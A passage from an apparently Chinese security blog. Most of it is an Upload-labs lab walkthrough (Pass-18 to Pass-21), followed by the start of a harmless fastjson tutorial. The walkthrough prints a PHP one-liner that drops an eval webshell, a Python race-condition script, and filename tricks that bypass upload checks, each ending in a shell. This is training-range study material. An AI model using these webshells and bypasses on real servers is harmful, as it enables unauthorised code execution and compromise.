<p>作用：一旦访问到该文件就会在当前目录下生成一个<code>shell.php</code>的一句话</p>
<p>上传bp抓包，清除payload</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718115515861.png"></p>
<p>改为<code>Null payload</code>，设置无限重复</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718115623598.png"></p>
<p>然后写py脚本，通过它来不停的访问我们上传上去的PHP文件</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718115920505.png"></p>
<p>现在bp开始攻击</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718120201648.png"></p>
<p>在bp攻击的同时，运行脚本，当出现<code>OK</code>时说明访问到了该文件</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718120135669.png"></p>
<p>那么我们的一句话木马被成功解析，然后蚁剑连接</p>
<p>（注意连接的是我们在当前目录写的<code>shell.php</code>）</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718120350333.png"></p>
<p>成功<code>getshell</code></p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718120452777.png"></p>
<h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>此题要修改下文件</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718145714365.png"></p>
<p>源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =<span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">MyUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">upload</span>(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isUploadedFile</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setDir</span>( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkExtension</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSize</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkFileExists</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">renameFile</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>相比于前一关多了对后缀名检测，所以我们只能传图片马，而且需要在图片马没有被重命名之前访问它。要让图片马能够执行还要配合其</p>
<p>他漏洞，比如文件包含，<code>apache</code>解析漏洞等。</p>
<p>此题可以结合文件包含漏洞</p>
<p>先创建<code>2.php</code>，写入一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;shell&quot;])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p>利用cmd命令合成图片马</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718142020614.png"></p>
<p>上传图片马，然后流程跟第十八关类似</p>
<p>不过要修改脚本，因为是结合文件上传漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://upload-labs-master/include.php?file=upload/3.png&quot;</span><br><span class="line">while True:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    if ( &#x27;Warning&#x27;  not in  str(html.text)):</span><br><span class="line">        print(&#x27;ok&#x27;)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

<p>bp开始攻击</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718142452700.png"></p>
<p>攻击时运行脚本</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718142444476.png"></p>
<p>然后蚁剑连接</p>
<p>(注意URL，因为我们修改文件，保存的位置是在根目录)</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718145619328.png"></p>
<h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析源代码，首先会对文件名后缀检测，上传文件类型不能在黑名单中</p>
<p>然后通过<code>pathinfo()</code>内置函数，<code>$file_ext</code>变量将包含<code>$file_name</code>中的文件扩展名（不包括点号）</p>
<p>然后拼接路径<code>$img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;</code></p>
<h3 id="方法一（文件夹名欺骗绕过）"><a href="#方法一（文件夹名欺骗绕过）" class="headerlink" title="方法一（文件夹名欺骗绕过）"></a>方法一（文件夹名欺骗绕过）</h3><p>由于题目的保存文件名是可控的</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718190252766.png"></p>
<p>我们可以借助<code>move_uploaded_file()</code>的特性会忽略掉文件末尾的 <code>/</code>来进行绕过</p>
<p>（即保存的文件名可以为<code>upload-19.php/.</code>）</p>
<p>我们上传<code>php文件</code>的一句话木马</p>
<p>抓包，修改两个位置绕过检测</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718190756965.png"></p>
<p>成功<code>getshell</code></p>
<p>(注意URL末尾没有<code>.</code>)</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718190909940.png"></p>
<p>当然，保存的文件名可以为<code>upload-19.php.</code></p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718191627794.png"></p>
<p>也能绕过</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718191706003.png"></p>
<h3 id="方法二（-00截断攻击）"><a href="#方法二（-00截断攻击）" class="headerlink" title="方法二（%00截断攻击）"></a>方法二（%00截断攻击）</h3><p>文件保存为<code>upload-19.php%00.jpg</code>也能绕过</p>
<p>（不过版本问题，上传不成功）</p>
<h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2><p>源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注：</p>
<p><code>reset()</code> 获取数组的第一个元素</p>
<p><code>end()</code> 获取数组的最后一个元素</p>
<p><code>count()</code>获取数组或对象的元素数量（<strong>至关重要</strong>）</p>
<p>分析源代码：</p>
<ol>
<li>首先是MIME检测</li>
<li>继续运用三元运算符判断POST的参数是否为空</li>
<li>然后再判断是否为数组，若不为则根据点号分开（即让文件名和扩展名分别为数组的值）</li>
<li>接着将拓展名即<code>$file[count($file) - 1]</code>与白名单对比</li>
<li>最后若合法则拼接路径</li>
</ol>
<p>绕过条件比较难，不过可以利用POST传参数组</p>
<ul>
<li>只需要让第一个值即save_name[0]&#x3D;<code>upload-20.php</code>（<code>.php</code>是为了能被解析）</li>
<li>然后再让数组最后一个值为<code>jpg</code>就能绕过</li>
</ul>
<p><strong>但是这里就有问题，为什么最后一个值<code>jpg</code>不会拼接路径里呢</strong></p>
<blockquote>
<p>因在于这个拼接过程用的是count函数，如果数组有三位，但是有一位为空，最后count出来的数就为2，而非为3。</p>
</blockquote>
<p>所以我们传参save_name[2]&#x3D;<code>jpg</code>，让save_name[1]为空即可</p>
<p>上传抓包</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718205923017.png"></p>
<p>成功<code>getshell</code></p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230718210209030.png"></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson入门学习</title>
    <url>/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0.html</url>
    <content><![CDATA[<p>记录对java安全的初次探索</p>
<span id="more"></span>

<h1 id="fastjson入门学习"><a href="#fastjson入门学习" class="headerlink" title="fastjson入门学习"></a>fastjson入门学习</h1><p><a href="https://xz.aliyun.com/t/13386?time__1311=mqmxnDBG0QQeqGNDQi5BKvC7Dc7oF3d4D&alichlgref=https://xz.aliyun.com/u/56767">参考文章</a></p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>简介</strong></p>
<blockquote>
<p>Fastjson是一个Java语言编写的高性能JSON解析库，它提供了强大的JSON处理能力，能够在Java对象和JSON之间进行快速、灵活的相互转换。</p>
</blockquote>
<h3 id="fastjson如何用"><a href="#fastjson如何用" class="headerlink" title="fastjson如何用"></a>fastjson如何用</h3><p>在IDEA创建一个maven项目，打开pox.xml在末尾添加如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.2.50&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320225857395.png"></p>
<p>添加完记得点击右侧的maven重新加载</p>
<p>然后就可以编写简单的demo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 将一个 Java 对象序列化为 JSON 字符串</span><br><span class="line">        Person person = new Person(&quot;Alice&quot;, 18);</span><br><span class="line">        String jsonString = JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        // 将一个 JSON 字符串反序列化为 Java 对象</span><br><span class="line">        String jsonString2 = &quot;&#123;\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;Bob\&quot;&#125;&quot;;</span><br><span class="line">        Person person2 = JSON.parseObject(jsonString2, Person.class);</span><br><span class="line">        System.out.println(person2.getName() + &quot;, &quot; + person2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义一个简单的 Java 类</span><br><span class="line">    public static class Person &#123;</span><br><span class="line">        private String name;</span><br><span class="line">        private int age;</span><br><span class="line"></span><br><span class="line">        public Person(String name, int age) &#123;</span><br><span class="line">            this.name = name;</span><br><span class="line">            this.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public String getName() &#123;</span><br><span class="line">            return name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public int getAge() &#123;</span><br><span class="line">            return age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码很好的展示了Fastjson应用的方便之处，可以将Java对象和JSON之间快速转换，执行结果如下</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320230127970.png"></p>
<p>此外我们可以注意到下面这行代码的表述吗，用的是<code>Person.class</code>来直接进行映射，这是由于<code>Java</code>类的属性名和<code>JSON</code>字段名是相同的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Person person2 = JSON.parseObject(jsonString2, Person.class);</span><br></pre></td></tr></table></figure>

<p>如果不相同的话，可以使用<code>@JSONField</code>注解来指定<code>Java</code>类的属性和<code>JSON</code>字段之间的映射关系</p>
<p>demo如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.annotation.JSONField;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 将一个 Java 对象序列化为 JSON 字符串</span><br><span class="line">        Person person = new Person(&quot;Alice&quot;, 18);</span><br><span class="line">        String jsonString = JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        // 将一个 JSON 字符串反序列化为 Java 对象</span><br><span class="line">        String jsonString2 = &quot;&#123;\&quot;user_age\&quot;:20,\&quot;user_name\&quot;:\&quot;Bob\&quot;&#125;&quot;;</span><br><span class="line">        Person person2 = JSON.parseObject(jsonString2, Person.class);</span><br><span class="line">        System.out.println(person2.getName() + &quot;, &quot; + person2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义一个简单的 Java 类</span><br><span class="line">    public static class Person &#123;</span><br><span class="line">        @JSONField(name = &quot;user_name&quot;)</span><br><span class="line">        private String name;</span><br><span class="line">        @JSONField(name = &quot;user_age&quot;)</span><br><span class="line">        private int age;</span><br><span class="line">        public Person(String name, int age) &#123;</span><br><span class="line">            this.name = name;</span><br><span class="line">            this.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public String getName() &#123;</span><br><span class="line">            return name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public int getAge() &#123;</span><br><span class="line">            return age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下，会发现也能成功在<code>Java</code>类的属性和<code>JSON</code>字段之间进行转换</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320231233090.png"></p>
